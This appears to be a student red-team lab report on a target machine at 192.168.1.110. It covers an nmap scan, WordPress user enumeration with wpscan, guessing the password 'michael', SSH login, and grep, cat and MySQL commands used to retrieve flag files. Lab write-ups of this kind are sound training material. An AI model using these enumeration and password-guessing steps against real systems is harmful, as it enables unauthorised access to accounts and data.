# Red Team: Summary of Operations

## Table of Contents

## Exposed Services

Critical Vulnerabilities
Exploitation

## Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

$ nmap -sS -v -A 192.168.1.110/24
![Activity Day 2 part 1  command nmap -sS -v -A](https://user-images.githubusercontent.com/88813019/157799806-92218ca1-45ea-42da-98a9-9e6ead4560ae.PNG)

Insert scan output

This scan identifies the services below as potential points of entry:

### Target 1:

List of Exposed Services:
- Port 22 (SSH)
- Port 80 (HTTP)
- Port 111 (rcpbind)

The following vulnerabilities were identified on each target:

- Identification and Authentication Failures
- Weak passwords
- Unprotected files
- User Enumeration (WordPress)

## Exposed Services

The following vulnerabilities were identified on each target:

#### Target 1
We ran the command: wpscan --url http://192.168.1.110/wordpress --enumerate u
This command will find the usernames "michael" and "steven" 

We guess michaels password which is "michael"

![Activity Day 2 Part 1  users](https://user-images.githubusercontent.com/88813019/157802049-21bb43d6-8306-4f51-9368-67f0d35b9089.PNG)

- Using ssh michael@192.168.1.110 with his password "michael" to gain access to his account.

## Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

### Target 1

flag1.txt:

![Activity 1 Day 2  Flag 1 1](https://user-images.githubusercontent.com/88813019/157802938-dcb745a7-11a9-4f9a-8c27-76c080b6111e.PNG)

Command used: $grep flag * 1 service.html

flag2.txt: 

![Activity Day 2 Part 1  Flag 2](https://user-images.githubusercontent.com/88813019/157804510-9c3fab66-b2b7-4404-b403-023905c19974.PNG)

Command used: cat flag2.txt

flag3.txt: 

![flag3](https://user-images.githubusercontent.com/88813019/157804799-9bc22142-63ab-4ace-b189-837a8d1e5e6d.png)

Commands used: 
- mysql -h localost -u root -p
- show databases;
- use wordpress;
- show tables;
- select * from wp_posts;

Flag4.txt: 

![Activity 1 Day 2 part 7 1](https://user-images.githubusercontent.com/88813019/157805372-dfeeeb22-d81e-4091-b72d-4470cf44e2ae.PNG)

